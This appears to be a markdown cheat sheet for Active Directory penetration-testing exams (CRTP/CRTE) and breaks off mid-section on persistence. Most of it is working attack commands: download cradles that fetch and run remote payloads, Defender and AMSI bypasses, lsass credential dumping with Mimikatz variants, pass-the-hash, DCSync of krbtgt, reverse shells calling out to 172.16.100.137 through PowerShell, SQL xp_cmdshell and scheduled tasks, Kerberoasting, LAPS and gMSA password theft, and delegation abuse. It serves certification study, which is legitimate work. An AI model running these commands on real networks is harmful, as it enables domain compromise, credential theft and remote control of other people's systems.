
# Cheatsheet

Originally for the CRTP and CRTE exams

## Powershell Download Cradles

```powershell
iex (New-Object Net.WebClient).DownloadString('https://somehting/payload.ps1')
# Or
$ie = New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('https://somehting/payload.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response

# PSv3 onwards: 
iex (iwr 'https://somehting/payload.ps1')
# or
$h=New-Object _comObject Msxml2.XMLHTTP;$h.open('GET','https://somehting/payload.ps1',$false);$h.send();iex $h.responseText
# or
$wr = [System.Net.WebRequest]::Create("https://something/paylaod.ps1"); $r = $wr.GetResponse(); IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

## Bypasses

```powershell
# AMSI bypass text file before local admin
# With local admin:
Set-MpPreference -DisableRealtimeMonitoring $true

# Check applocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Check for DeviceGuard:
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard

# PS execution policy
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"

# Bypass Powershell logging with invisi-shell: https://github.com/OmerYa/Invisi-Shell
# Without admin: (Recommended - Only adds registry for current user)
RunWithRegistryNonAdmin.bat
# Type "exit" from the new powershell session to complete the cleanup - removes added registry.
```

## AV Signature bypasses

AMSITrigger (Github) - detect exact part of script - https://github.com/RythmStick/AMSITrigger  
DefenderCheck (Github) - identify code and strings from a binary/file that defender may flag - https://github.com/matterpreter/DefenderCheck  

Provide path and file to scan: `AMSITrigger_x64.exe -i c:\path\to\script.ps1` and `DefenderCheck.exe PowerUp.ps1`  
For full obfuscation of PS scripts: Invoke-Obfuscation (Github) - https://github.com/danielbohannon/Invoke-Obfuscation  

## Payload Delivery

Use NetLoader (https://github.com/Flangvik/NetLoader) to deliver our binary payloads.  
Basic usage:  

```powershell
# Run on remote machine to load remote binary:
C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
```

Use a port forward to bypass Defender checks:  

```powershell
# run hfs.exe on local machine with the desired binary (https://www.rejetto.com/hfs/)
net use x: \\<remote-hostname>\C$\Users\Public /user:<remote-hostname>\<Username> <password>
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
# remove the share:
net use x: /d

winrs -r :<target-hostname> -u:hostname\user -p:password cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<ip with hfs>
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe

# If the binary fails, check for AppLocker or DeviceGuard
```

## Convert SID to Name

```powershell
# AD Module
Get-ADUser -Identity <sid>
Get-ADGroup -Identity <sid>
```

## Convert Password to Hash

```powershell
Rubeus.exe hash /password:Qwerty@2019 /user:<user> /domain:<domain.local>
```

## Services and Their Abuses

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#abusing-service-tickets  

| Service | Abuse |
| --- | --- |
| CIFS | Access filesystem |
| HOST | Create scheduled tasks |
| HOST + RPCSS | Execute WMI in the target system |
| HOST + WSMAN (WINRM) | Can access target machine and get a Powershell (Enter-PSSession) |
| LDAP | Perform DCSync |
| HTTP | Access via `winrs` |

## Domain Enum

Using ActiveDirectory Module: https://github.com/samratashok/ADModule/tree/master/ActiveDirectory  
Or Powerview: https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1  
Or BloodHound: https://github.com/BloodHoundAD/BloodHound  

```powershell
Get-Domain # powerview
Get-ADDomain # AD Module

Get-Domain -Domain new.domain.local # powerview
Get-ADDomain -Identity new.domain.local # AD Module

Get-DomainSID # powerview
(Get-ADDomain).DomainSID # AD module

Get-DomainPolicyData # Powerview
(Get-DomainPolicyData).systemaccess # Powerview
(Get-DomainPolicyData).kerberospolicy # Powerview - abide by this for creating golden tickets
(Get-DomainPolicyData -Domain alt.local).systemaccess # Powerview

Get-DomainController # powerview
Get-ADDomainController # AD Module
Get-DomainController -Domain alt.local # powerview
Get-ADDomainController -DomainName alt.local # AD Module

Get-DomainUser # powerview
Get-DomainUser -Identity <username> # powerview
Get-ADUser -Filter * -Properties * # ad module
Get-ADUser -Identity studentuser1 -Properties * # ad module

Get-DomainUser -Identity studentuser1 -Properties * # powerview
Get-DomainUser -Properties pwdlastset # powerview
# view all of the properties that can be selected
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name # ad module
# method to detect deception users - they won't have any password resets of logon counts
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}} # ad module

Get-DomainUser -LDAPFilter "Description=*built*" | Select name,Description # powerview
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description # ad module

Get-DomainComputer | select Name # powerview
Get-DomainComputer –OperatingSystem "Windows Server 2019 Standard" # powerview
Get-DomainComputer -Ping # powerview
Get-DomainComputer -SearchBase "<organisational unit DN>" # powerview (find computers in an OU)
Get-ADComputer -Filter * | select Name # ad module
Get-ADComputer -Filter 'OperatingSystem -like "*Windows Server 2019 Standard*"' -Properties OperatingSystem | select Name,OperatingSystem # ad module
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName} # ad module
Get-ADComputer -Filter * -Properties * # ad module

Get-DomainGroup –Domain techcorp.local # powerview
Get-ADGroup -Filter * | select Name # ad module
Get-ADGroup -Filter * -Properties * # ad module
Get-ADGroup -Identity <groupname> -Properties * # ad module
Get-DomainGroup *admin* # powerview
# enterprise admin group should only be in the parent domain
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name # ad module

Get-DomainGroupMember -Identity "Domain Admins" -Recurse # powerview
Get-ADGroupMember -Identity "Domain Admins" -Recursive # ad module

# Function to enumerate groups recursively using AD Module
# Usage: `Get-ADPrincipalGroupMembershipRecursive 'username1'`
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
{
  $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
  $groups
  if ($groups.count -gt 0)
  {
    foreach ($group in $groups)
    {
      Get-ADPrincipalGroupMembershipRecursive $group
    }
  }
}

Get-DomainGroup –UserName studentuser1 # powerview
Get-ADPrincipalGroupMembership -Identity studentuser1 # ad module - Run this against each group to find nested memberships

# Get all the local groups on a machine (needs administrator privs on non-dc machines)
Get-NetLocalGroup -ComputerName us-dc # powerview
# Get members of all local groups on a machine (needs administrator privs on non-dc machines) :
Get-NetLocalGroupMember -ComputerName us-dc # powerview
# Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators # powerview

Get-DomainGPO # powerview
Get-DomainGPO -ComputerIdentity student1.us.techcorp.local # powerview

# Get GPO(s) which use Restricted Groups or groups.xml for interesting users
Get-DomainGPOLocalGroup

# Get users which are in a local group of a machine using GPO
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity student1.us.techcorp.local # powerview
Get-DomainGPOComputerLocalGroupMapping –ComputerIdentity us-mgmt.us.techcorp.local # powerview

# Get machines where the given user is member of a specific group
Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose # powerview

Get-DomainOU # powerview
Get-ADOrganizationalUnit -Filter * -Properties * # ad module
# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-DomainOU
Get-DomainGPO -Identity '{7162874B-E6F0-45AD-A3BF-0858DA4FA02F}' # powerview

# Get users which are in a local group of a machine in any OU using GPO
(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping # powerview
# Get users which are in a local group of a machine in a particular OU using GPO
(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping # powerview
# Get computers in an OU
(Get-DomainOU -Identity <OU name>).distinguishedname | %{Get-DomainComputer -SearchBase $_}
# There is a bug in PowerView, otherwise the below command would work
Get-DomainGPOComputerLocalGroupMapping -OUIdentity 'OU=Mgmt,DC=us,DC=techcorp,DC=local' # powerview

# Read ACLs: "SecurityIdentifier" has "ActiveDirectoryRights" on "ObjectDN" with "AceType" 
# reference IdentityReferenceName if GUIDs resolve
# Get the ACLs associated with a specified object
Get-DomainObjectAcl -Identity studentuser1 –ResolveGUIDs # powerview
# Get the ACLs associated with the specified LDAP path to be used for search
Get-DomainObjectAcl -Searchbase "LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local" -ResolveGUIDs -Verbose # powerview
# We can also enumerate ACLs using the ActiveDirectory module but without resolving GUIDs
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local').Access # powerview

# Search for interesting ACEs (use without GUIDs for faster result)
Find-InterestingDomainAcl -ResolveGUIDs # powerview
# Get the ACLs associated with the specified path
Get-PathAcl -Path "\\us-dc\sysvol" # powerview

# Enum ACLs for a group that the current user is a part of
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'managers'}
```

Find IP Address for a forest that has no DNS entry  

```powershell
# powerview
Get-DnsServerZone -ZoneName <forest>.local
```

ACL enumeration methodology  

```powershell
# Powerview
# run `whoami` and fill in your username into the command below
Get-DomainGroup -UserName "username" | select samaccountname,description,objectsid

# For each group you are a part of, your username, and any compromised users, run the following command:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match '<groupName/username>'}
# Look for objects that you have genericWrite/genericAll rights over 

# If you need to convert SIDs to its readable name, use AD Module:
Get-ADUser -Filter * -Server <domain> | ?{$_.SID -match '<SID>'}
Get-ADGroup -Filter * -Server <domain> | ?{$_.SID -match '<SID>'}
Get-ADObject -Filter * -Server <domain> | ?{$_.SID -match '<SID>'}

# Exploit example: Generic write over another group
# Powerview
Add-DomainGroupMember -Members <currentUser> -Identity <targetGroup>
```

**ACL Exploitation:**  
<https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericwrite-on-user>  
GenericAll - full rights to the object (add users to a group or reset user's password)  
GenericWrite - update object's attributes (i.e logon script)  
WriteOwner - change object owner to attacker controlled user take over the object  
WriteDACL - modify object's ACEs and give attacker full control right over the object  
AllExtendedRights - ability to add user to a group or reset password  
ForceChangePassword - ability to change user's password  
Self (Self-Membership) - ability to add yourself to a group  

| ACL | Object Type | Abuse |
| --- | --- | --- |
| GenericAll | User | Change the users password: `net user <username> <new password> /domain` |
| GenericAll | Group | Add yourself to the group: `net group "<group name>" <username> /add /domain` - Can also do with PowerView or ADModule |
| GenricAll/GenericWrite | Computer | See "Resource based constrained delegation" in this file |
| WriteProperty | Group | Add yourself to the group: `net group "<group name>" <username> /add /domain` - Can also do with PowerView or ADModule |
| Self | Group | Add yourself to the group: `net group "<group name>" <username> /add /domain` - Can also do with PowerView or ADModule |
| WriteProperty (Self-Membership) | Group | Add yourself to the group: `net group "<group name>" <username> /add /domain` - Can also do with PowerView or ADModule |
| ForceChangePassword (ExtendedRight) | User | Reset user's password (powerview): `Set-DomainUserPassword -Identity <username> -AccountPassword (ConvertTo-SecureString '<password>' -AsPlainText -Force) -Verbose` |
| WriteOwner | Group | Change group owner (powerview): `Set-DomainObjectOwner -Identity <group SID> -OwnerIdentity "<username>" -Verbose` |
| GenericWrite | User | [Write a specific object attached to a user](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericwrite-on-user)  |

## Forest Enumeration

Using ADModule or PowerView

```powershell
Get-DomainTrust # powerview
Get-DomainTrust –Domain techcorp.local # powerview
Get-ADTrust # ad module
Get-ADTrust –Identity techcorp.local # ad module

# Get details about the current forest
Get-Forest # powerview
Get-ADForest # ad module
# Get all domains in the current forest
Get-ForestDomain # powerview
(Get-ADForest).Domains # ad module

# Get all global catalogs for the current forest
Get-ForestGlobalCatalog # powerview
Get-ADForest | select -ExpandProperty GlobalCatalogs # ad module
# Map trusts of a forest
Get-ForestTrust # powerview
Get-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADForest).Name # ad module
```

## User Hunting

```powershell
# Find all machines on the current domain where the current user has local admin access (PowerView):
Find-LocalAdminAccess –Verbose # powerview
# This function queries the DC of the current or provided domain for a list of
# computers (Get-DomainComputer) and then use multi-threaded Test-AdminAccess on each machine
# This is noisy and it is recommended to only run this on specific machines which you want to target

# This can also be done with the help of remote administration tools like WMI and
# PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.
# See Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1

# Find computers where a domain admin (or specified user/group) has sessions:
Find-DomainUserLocation -Verbose # powerview
Find-DomainUserLocation -UserGroupIdentity "StudentUsers" # powerview
# This does not work on win server 2019 or newer versions of win 10. Need local admin access to bypass this.
# This function queries the DC of the current or provided domain for members of the
# given group (Domain Admins by default) using Get-DomainGroupMember, gets
# a list of computers (Get-DomainComputer) and list sessions and logged on users
# (Get-NetSession/Get-NetLoggedon) from each machine.
# This does not work on win server 2019 or newer versions of win 10. Need local admin access to bypass this

# Find computers where a domain admin session is available and current
# user has admin access (uses Test-AdminAccess).
Find-DomainUserLocation -CheckAccess
# Find computers (File Servers and Distributed File servers) where a
# domain admin session is available.
Find-DomainUserLocation –Stealth
```

## Local PrivEsc

PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc  
BeRoot: https://github.com/AlessandroZ/BeRoot  
Privesc: https://github.com/enjoiz/Privesc  
winPEAS: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS  

```powershell
# Run all checks from :
# PowerUp
Invoke-AllChecks
# BeRoot
beRoot.exe
# Privesc:
Invoke-PrivEsc
# PEASS-ng:
winPEASx64.exe

# Add current user to admins group
# PowerUp
# Get abuse help: `help Invoke-ServiceAbuse -examples
# Unquoted service path example:
Invoke-ServiceAbuse -Name '<service name>' -User <domain>\<username>

# Manual modifiable service path abuse
# https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/
sc.exe qc <service name>
sc.exe config <service name> binPath="net localgroup Administrators <domain>\<user> /add"
sc.exe stop <service name>
sc.exe start <service name>
```

## Remote Access Options

`winrs` can be used if we have local admin on a machine or if we have a HTTP ticket in our session:  
Can be used to  bypass PSRemoting's system-wide transcripts and script block logging.  

```powershell
# If we have local admin access, this command should run on the target host
winrs -r:<target-hostname> "hostname"
# Interactive shell:
winrs -r:<target-hostname> cmd
# Specifying credentials:
winrs -r :<target-hostname> -u:hostname\user -p:password cmd
```

Powershell Remoting:  

```powershell
# Stateful sessions/commands
$sess = New-PSSession -ComputerName Server1
Enter-PSSession -Session $sess
Invoke-Command -Session $sess -FilePath .\PowerUp.ps1
Invoke-Command -Session $sess -ScriptBlock {whoami}
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName domain.local
# can try adding "-Credential username/password" if you have creds for the remote machine

# Connect with an IP address
# Set WSMan settings from an elevated shell
Set-Item WSMan:\localhost\Client\TrustedHosts * -Force
# PSRemote (a shell with NTLM has is required, not AES256 keys)
Enter-PSSession -ComputerName 192.168.102.1 -Authentication NegotiateWithImplicitCredential
```

## Lateral Movement Options

Mimikatz dump creds:  

```powershell
# Mimikatz dump creds
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds # On target machine
Invoke-Mimikatz -DumpCreds -ComputerName <computer name> # On remote machine that we have local admin for

# Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
SafetyKatz.exe "sekurlsa::ekeys"

# Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
SharpKatz.exe --Command ekeys

# Dump credentials using Dumpert (Direct System Calls and API unhooking)
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump

# Using pypykatz (Mimikatz functionality in Python)
pypykatz.exe live lsa

# Using comsvcs.dll (LOLBin)
tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full
# May need to disable defender if lsass.dmp is being detected
# Take the dmp file offline and dump with mimikatz:
sekurlsa::minidump c:\AD\Tools\lsass.dmp
privilege::debug
sekurlsa::ekeys
```

Over Pass The Hash:  

```powershell
# Invoke-Mimikatz.ps1
# Mimikatz new shell with user creds (with NTLM)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash> /run:powershell.exe"'
# Mimikatz new shell with user creds (with AES256)
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /aes256:<aes256key> /run:powershell.exe"'

# SafetyKatz.exe
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"

# Rubeus
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

DCSync:  

```powershell
# Needs DA privs

# Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
# SafetyKatz.exe
SafetyKatz.exe "lsadump::dcsync /user:<domain>\krbtgt" "exit"
```

Invoke-PowerShellTCP.ps1:  

```powershell
# Web Reverse shell
powershell.exe -c "iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTCP -Reverse -IPAddress 172.16.100.137 -Port 443"
```

SQL reverse shell:  

```powershell
# SQL reverse shell
'exec master..xp_cmdshell "powershell iex (New-Object Net-WebClient).DownloadString(''http://172.16.100.137/Invoke-PowershellTcp.ps1'')"'
powershell.exe iex (iwr http://172.16.100.137/Invoke-PowershellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.137 -Port 443


# SQL reverse shell
select * from openquery("192.168.23.25",'select * from openquery("<db-server>",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')

# Rev shell using powerup SQL
# Get script block logging bypass, amsi bypass and then reverse shell script
Get-SQLServerLinkCrawl -Instance <sql-instance> -Query 'exec master..xp_cmdshell  ''powershell -c "iex (iwr -UseBasicParsing http://192.168.100.138/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/amsibypass.txt);iex (iwr -UseBasicParsing http://192.168.100.138/Invoke-PowerShellTcpEx.ps1)"'''
```

Scheduled task reverse shell:  

```powershell
# Make sure powershell script has added call at the end of the file
# Host powershell script in the web server
# Start a listener with powercat
# Ensure firewalls are turned off
schtasks /create /S full.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "<username>" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://<host-ip>/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S full.domain.local /TN "<username>"
# Check listener
```

Map a remote folder from compromised machine to a letter drive on your local machine, to copy files across:  

```powershell
# map the drive
net use x: \\<remote-hostname>\C$\Users\Public /user:<remote-hostname>\<Username> <password>
# copy files local to remote
echo F | xcopy C:\AD\Tools\Loader.exe x:\Loader.exe
# remove the share:
net use x: /d
```

## Domain Privesc - Kerberos

**Kerberoasting:**  

Find kerberoastable users:  

```powershell
# ActiveDirectory module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
# PowerView
Get-DomainUser –SPN
```

Request TGS tickets using Rubeus (https://github.com/GhostPack/Rubeus):  
(These will trigger MDI alerts if the targeted accounts are set to support AES encryption)  

```powershell
# [!] Do not use rubeus inside invisi-shell

# Use Rubeus to list Kerberoast stats
Rubeus.exe kerberoast /stats
# Use Rubeus to request a TGS
Rubeus.exe kerberoast /user:serviceaccount /simple

# To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17
# stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:serviceaccount /simple /rc4opsec

# Kerberoast all possible accounts
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

Request TGS tickets using Invoke-Kerberoast.ps1 (https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1):  

```powershell
Invoke-Kerberoast -Identity serviceaccount
```

Request tickets using .NET classes (need mimikatz to extract the ticket)(identify targets with PowerView, ADModule or Rubeus):  

```powershell
Add-Type –AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘MSSQLSvc/jefflab-sql02.jefflab.local:1433’
```

**Set SPN:**  

```powershell
# See if any of our current user's groups have any ACLs that allow a genAll or genWrite over a target user, e.g.:
# use powerview and match on our current users' groups
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

# See if the user already has a SPN:
# Using PowerView
Get-DomainUser -Identity <target-user> | select serviceprincipalname
# Using ActiveDirectory module:
Get-ADUser -Identity <target-user> -Properties ServicePrincipalName | select ServicePrincipalName

# Set the target users spn:
# Powerview
# Set a SPN for the user (unique for the domain)
Set-DomainObject -Identity <target-user> -Set @{serviceprincipalname='<domain>/myspnX'}
# Using ActiveDirectory module:
Set-ADUser -Identity <target-user> -ServicePrincipalNames @{Add='<domain>/myspnX'}

# Then kerberoast this user
```

## Domain Privesc - LAPS (Local Administrator Password Solution)

Find users who can read the password in clear text machines in OUs:  

```powershell
# PowerView
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}

# To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text:
# Using Active Directory module - See Get-LapsPermissions.ps1
# https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-management-powershell
# Using LAPS module (can be copied across machines):
Import-Module C:\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName # legacy
Find-LapsADExtendedRights -Identity OUDistinguishedName # new
```

Read the password:

```powershell
# PowerView
Get-DomainObject -Identity <targetmachine$> | select -ExpandProperty ms-mcs-admpwd
# Active Directory module
Get-ADComputer -Identity <targetmachine> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd
# LAPS module
Get-AdmPwdPassword -ComputerName <targetmachine> # legacy
Get-LapsADPassword -ComputerName <targetmachine> # new
```

Use the LAPs password:  

```powershell
winrs -r:<target-server> -u:.\administrator -p:<password> cmd
```

## Domain privesc - gMSA

For over-pass-the-hash, the gMSA username is the account username with 'msDS-GroupManagedServiceAccount'  

```powershell
# A gMSA has object class 'msDS-GroupManagedServiceAccount'. This can be used to find the accounts that can read the managed password.
# Using ADModule
Get-ADServiceAccount -Filter *
# Using PowerView
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'

# The attribute 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob.
# Read it using ADModule:
Get-ADServiceAccount -Identity <target-user> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

# Once we have compromised a principal that can read the blob. Use ADModule to read and DSInternals to compute NTLM hash:
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1 # (https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1)
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
# The 'CurrentPassword' attribute in the $decodedpwd contains the clear-text password but cannot be typed
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

# Passing the NTLM hash of the gMSA, we get privileges of the gMSA.
sekurlsa::pth /user:<target-user> /domain:<domain> /ntlm:0a02c684cc0fa1744195edd1aec43078
# We can access the services and machines (server farms) that the account has access to
```

## Domain Privesc - Secrets in Registries

```powershell
# start invisi-shell on the target machine, then:
ls cert:\LocalMachine\My

# export certificate and store on disk (password is used for importing - not the users password)
ls cert:\LocalMachine\My\<thumbprint> | Export-PfxCertificate -FilePath c:\Users\Public\<user>.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)
# copy to local machine for later use
```

## Domain Privesc - Delegation

**Unconstrained Delegation:**  

```powershell
# Powerview
Get-NetComputer -UnConstrained
# Using ActiveDirectory module:
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
Get-ADUser -Filter {TrustedForDelegation -eq $True}

# Compromise where unconstrained delegation is enabled
# After the connection, we can export TGTs using the below command:
Invoke-Mimikatz –Command '"sekurlsa::tickets /export"'
# The ticket could be reused:
Invoke-Mimikatz –Command '"kerberos::ptt ticket.kirbi"'
```

Use the spooler service to force a connection from a target machine in the domain:  
Use this against the domains DC to get the DC$ hash to create a new shell with this machine accounts privileges.  

```powershell
# Use MS-RPRN.exe (https://github.com/leechristensen/SpoolSample):
.\MS-RPRN.exe \\<target-machine-FQDM> \\<FQDM-of-unconstrained-delegation-machine>
# We can capture the TGT of of the target machine by using Rubeus (https://github.com/GhostPack/Rubeus) on the machine with unconstrained delegation:
.\Rubeus.exe monitor /interval:5 /nowrap

###

# We can also use PetitPotam.exe (https://github.com/topotam/PetitPotam) on the machine with unconstrained delegation:
.\PetitPotam.exe <machine-w-unconstrained-delegation> <target-machine>
# On the machine with unconstrained delegation:
.\Rubeus.exe monitor /interval:5
# PetitPotam uses EfsRpcOpenFileRaw function of MS-EFSRPC (Encrypting File System Remote Protocol) protocol and doesn't need credentials when used against a DC.
```

Dump creds:  

```powershell
# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker'machine:
Rubeus.exe ptt /ticket:<base64 encoded text from rubeus monitor>
# Or
[IO.File]::WriteAllBytes("C:\DC.kirbi",
[Convert]::FromBase64String("ticket_from_Rubeus_monitor"))
# Or use Invoke-Mimikatz:
Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\Tools\USDC.kirbi"'

# Run DCSync:
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

**Constrained Delegation:**  

```powershell
# Using PowerView
Get-DomainUser –TrustedToAuth
Get-DomainComputer –TrustedToAuth
# Using ActiveDirectory module:
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

# Using Kekeo (https://github.com/gentilkiwi/kekeo), we request a TGT for the first hop service account (we can use a password or NTLM hash):
tgt::ask /user:<user-w/constrained-delegation> /domain:<domain> /rc4:<ntlm hash>

# Verification is not performed on the specified SPN. The sname field is unencrypted and can be modified while requesting the TGS for any SPN.
# kekeo
tgs::s4u /tgt:<kirbi-file-from-previous> /user:Administrator /service:CIFS/<hostname>|HTTP/<hostname>
# In addition to the service specified in msDs-AllowedToDelegateTo, we also specify an alternate service which uses the same service account as the one specified in msDs-AllowedToDelegateTo. This needs to be for the same host

# mimikatz
Invoke-Mimikatz '"kerberos::ptt <kirbi-file-from-previous>"'
Invoke-Command -ScriptBlock{whoami} -ComputerName <hostname>

# or
# Using Rubeus:
Rubeus.exe s4u /user:<target-user> /rc4:<ntlm-hash> /impersonateuser:administrator /msdsspn:CIFS/<hostname> /altservice:HTTP /domain:<domain> /ptt
# rc4 hash above can be changed to use /aes256 if that works better
# rc4 is the same as ntlm
winrs -r:<computer> cmd.exe
```

**Resource Based Constrained Delegation:**  

```powershell
# Enumerate if we have Write permissions over any object.
# Look at all interesting ACLs without filtering
# Using PowerView (filter by groups the compromised user is a part of):
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'mgmtadmin'}

# Bloodhound
# Select a user, then search for "outbound control rights" by clicking on the user and scrolling down

# If you have write perms over a domain computer
# Using the ActiveDirectory module, configure RBCD on a target-machine for the compromised/foothold machine:
$comps = 'foothold-machine1$'
Set-ADComputer -Identity <target-machine> -PrincipalsAllowedToDelegateToAccount $comps
# Now, let's get the privileges of foothold-machine1$ by extracting its AES keys:
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Use the AES key of foothold-machine1$ with Rubeus and access the target machine as ANY user we want:
.\Rubeus.exe s4u /user:foothold-machine1$ /aes256:<foothold-machine-aes256-key> /msdsspn:http/<target-machine> /impersonateuser:administrator /ptt
winrs -r:<target-machine> cmd.exe
```

## Persistence

**msDS-AllowedToDelegateTo:**  

```powershell
### Setup ###
# Using PowerView:
Set-DomainObject -Identity <newuser> -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity <new-user> -Set @{"msds-allowedtodelegateto"="ldap/<DC-FQDN>"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}

Get-DomainUser –TrustedToAuth

# Using AD module:
Set-ADUser -Identity <newuser> -ServicePrincipalNames @{Add='dev/svc'}
Set-ADUser -Identity <newuser> -Add @{'msDS-AllowedToDelegateTo'= @('ldap/<DC-hostname>','<DC-FQDN>')} -Verbose
Set-ADAccountControl -Identity <newuser> -TrustedToAuthForDelegation $true

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo

### Abuse ###
# Abuse using Kekeo:
kekeo# tgt::ask /user:<newuser> /domain:us.techcorp.local /password:Password@123!
kekeo# tgs::s4u /tgt:<kirbi-file-from-previous> /user:Administrator@<domain> /service:ldap/<DC-FQDN>

